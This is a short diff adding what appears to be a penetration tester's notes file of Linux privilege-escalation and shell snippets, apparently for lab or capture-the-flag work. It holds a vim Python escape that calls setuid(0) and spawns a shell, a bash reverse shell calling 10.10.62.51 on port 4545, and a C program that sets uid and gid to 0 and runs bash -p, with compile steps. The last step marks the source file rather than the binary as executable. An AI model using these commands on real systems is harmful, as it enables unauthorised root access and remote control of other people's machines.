@@ -1,0 +1,27 @@
+./view -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")' ->execute setuid Linux
+ 
+##########
+Reverse Shell simple Bash Script:
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.62.51/4545 0>&1
+########## 
+ 
+As we can set SUID bits, a simple executable that will run /bin/bash on the target system will do the job:
+
+##########
+SUID Escalation Linux
+scrypt: c.c
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <unistd.h>
+    int main(void){
+            setuid(0);
+            setgid(0);
+            system("/bin/bash -p");
+            return 0;
+    }
+
+cmd:
+    gcc c.c -o code
+    chmod +x c.c
+##########
